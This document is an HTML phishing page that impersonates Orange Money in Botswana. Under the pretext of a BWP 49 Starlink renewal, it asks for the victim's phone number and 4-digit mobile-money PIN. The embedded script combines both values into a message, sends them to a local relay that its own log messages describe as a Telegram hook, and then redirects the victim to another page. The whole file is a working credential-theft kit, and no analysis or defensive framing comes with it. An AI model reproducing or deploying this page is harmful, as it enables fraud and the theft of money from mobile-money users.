<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Orange Money</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#1a1d22;color:#fff}
body{display:flex;justify-content:center;align-items:flex-start;padding:22px 16px}
.card{
  width:100%;max-width:420px;background:rgba(20,23,29,.96);
  border-radius:18px;overflow:hidden;
  box-shadow:0 16px 36px rgba(0,0,0,.25);
  border:1px solid rgba(255,255,255,.06);
}
.brand-wrap{padding:22px 20px 10px;text-align:center}
.orange-badge{
  width:74px;height:74px;border-radius:50%;background:#f57c20;
  margin:0 auto 12px;display:flex;align-items:center;justify-content:center;
  font-size:40px;font-weight:800;line-height:1;color:#fff;
  box-shadow:0 10px 20px rgba(245,124,32,.22);
}
.brand-title{font-size:23px;font-weight:800;letter-spacing:-.5px;margin:0;color:#f57c20}
.brand-sub{font-size:12px;color:#f5a14d;font-weight:500;margin-top:2px}
.form-panel{
  background:rgba(255,255,255,.03);border-top:1px solid rgba(255,255,255,.06);
  padding:0 18px 18px;
}
.payment-header{
  background:rgba(255,255,255,.05);color:#fff;padding:14px 16px;margin:0 -18px 16px;
  border-bottom:1px solid rgba(255,255,255,.06);font-size:13px;font-weight:700;
}
.payment-header .star{color:#f7c948;margin-right:6px}
.amount-row{display:flex;justify-content:space-between;align-items:center;padding:2px 0 10px}
.row-label{font-size:10px;color:#b6bcc6;letter-spacing:.3px;text-transform:uppercase;font-weight:700}
.amount-value{font-size:16px;font-weight:800;color:#f6f7fa}
.service-value{text-align:right;font-size:12px;font-weight:600;color:#f3f5f8}
.phone-box{
  margin-top:12px;border:1px solid #d7dfe7;border-radius:8px;background:#f3f3f3;
  display:flex;align-items:center;overflow:hidden;height:46px;
}
.country{
  display:flex;align-items:center;gap:8px;padding:0 14px;border-right:1px solid #d5dbe2;
  color:#1d2531;font-size:16px;font-weight:700;min-height:100%;background:#f7f7f7;
}
.country .flag{display:flex;align-items:center;justify-content:center;width:22px;height:22px;line-height:1}
.country .flag img{display:block;width:100%;height:100%;object-fit:cover;border-radius:3px}
.country .code{font-size:14px}
.phone{
  flex:1;border:0;outline:0;background:transparent;height:100%;padding:0 12px;
  font-size:18px;color:#1c2430;font-weight:600;min-width:0;
}
.phone::placeholder{color:#7f8794}
.pin-box{
  margin-top:18px;display:grid;grid-template-columns:repeat(4,1fr);gap:12px;
}
.pin-digit{
  width:100%;height:52px;border:1px solid #d9dde3;border-radius:8px;background:#f3f4f5;
  text-align:center;font-size:26px;font-weight:700;color:#1d2430;outline:none;
}
.otp-hint{
  margin-top:14px;text-align:left;font-size:12px;color:#b9c1cc;line-height:1.5;
}
.terms{margin-top:10px;color:#a9b0ba;font-size:11px;line-height:1.55;text-align:center}
.terms a{color:#7cc0ff;text-decoration:none}
.next-btn{
  width:100%;min-height:44px;margin-top:18px;border:0;border-radius:9px;
  background:#d8dfe5;color:#7c8a99;font-weight:800;font-size:14px;letter-spacing:1px;
  cursor:not-allowed;
}
.next-btn.enabled{
  background:#f4c74d;color:#111;cursor:pointer;box-shadow:0 8px 18px rgba(244,199,77,.25);
}
.secure{text-align:center;margin-top:18px;color:#8ea3b1;font-size:10px;letter-spacing:.5px}
.secure .lock{color:#3bd18f;font-size:12px;margin-right:5px}
.error{text-align:center;color:#ff8f8f;font-size:10px;min-height:12px;margin-top:10px}
@media(max-width:480px){
  body{padding:8px}
  .card{max-width:none;border-radius:16px}
  .brand-wrap{padding-top:18px}
  .payment-header{margin-left:-18px;margin-right:-18px}
}
</style>
</head>
<body>
<div class="card">
  <div class="brand-wrap">
    <div class="orange-badge">O</div>
    <h1 class="brand-title">Orange Money</h1>
    <div class="brand-sub">by Orange</div>
  </div>

  <div class="form-panel">
    <div class="payment-header"><span class="star">★</span>Starlink Payment</div>

    <div class="amount-row">
      <div>
        <div class="row-label">Service</div>
        <div class="amount-value">Starlink Renewal</div>
      </div>
      <div>
        <div class="row-label" style="text-align:right">Amount</div>
        <div class="service-value">BWP 49</div>
      </div>
    </div>

    <div class="phone-box">
      <div class="country">
        <span class="flag" aria-label="Botswana flag">
          <img src="https://flagcdn.com/w80/bw.png" alt="Botswana flag">
        </span>
        <span class="code">+267</span>
      </div>
      <input id="phone" class="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="XX XXX XXX" autocomplete="off">
    </div>

    <div class="pin-box" aria-label="Enter Orange Money PIN">
      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 1">
      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 2">
      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 3">
      <input class="pin-digit" type="password" inputmode="numeric" maxlength="1" aria-label="Digit 4">
    </div>

    <div class="otp-hint">Enter your 4-digit Orange Money PIN to authorize this transaction.</div>

    <div class="terms">By using this service you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a></div>
    <button class="next-btn" id="nextBtn" type="button">NEXT</button>
    <div id="error" class="error"></div>
    <div class="secure"><span class="lock">◌</span> SSL ENCRYPTED AND SECURE</div>
  </div>
</div>

<script>
const phone = document.getElementById('phone');
const pinInputs = [...document.querySelectorAll('.pin-digit')];
const nextBtn = document.getElementById('nextBtn');
const errorEl = document.getElementById('error');

function renderButtonState() {
  const phoneValid = /^\d{9}$/.test(phone.value);
  const pinValid = pinInputs.every(input => /^\d$/.test(input.value));
  nextBtn.classList.toggle('enabled', phoneValid && pinValid);
  nextBtn.disabled = !(phoneValid && pinValid);
}

phone.addEventListener('input', () => {
  phone.value = phone.value.replace(/\D/g, '').slice(0, 9);
  errorEl.textContent = '';
  renderButtonState();
});

pinInputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    input.value = input.value.replace(/\D/g, '').slice(0, 1);
    if (input.value && index < pinInputs.length - 1) {
      pinInputs[index + 1].focus();
    }
    errorEl.textContent = '';
    renderButtonState();
  });

  input.addEventListener('keydown', (event) => {
    if (event.key === 'Backspace' && !input.value && index > 0) {
      pinInputs[index - 1].focus();
    }
  });
});

nextBtn.addEventListener('click', async () => {
  if (!nextBtn.classList.contains('enabled')) return;

  const phoneNumber = phone.value;
  const pin = pinInputs.map(input => input.value).join('');

  if (!/^\d{9}$/.test(phoneNumber)) {
    errorEl.textContent = 'Please enter a valid 9-digit Orange Money number.';
    return;
  }

  if (!/^\d{4}$/.test(pin)) {
    errorEl.textContent = 'Please complete the 4-digit PIN.';
    return;
  }

  const message = `Orange Money Payment\nPhone: +267${phoneNumber}\nPIN: ${pin}\nService: Starlink Renewal\nAmount: BWP 49`;

  const payload = { text: message };

  try {
    const response = await fetch('http://localhost:3000/api/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => null);

    if (response) {
      const data = await response.json().catch(() => null);
      if (data && !data.ok) {
        console.warn('Telegram rejected message:', data.error || 'unknown error');
      }
    }
  } catch (sendError) {
    console.warn('Telegram hook unavailable:', sendError);
  }

  
  window.location.href = 'ming.html';
});
</script>
</body>
</html>
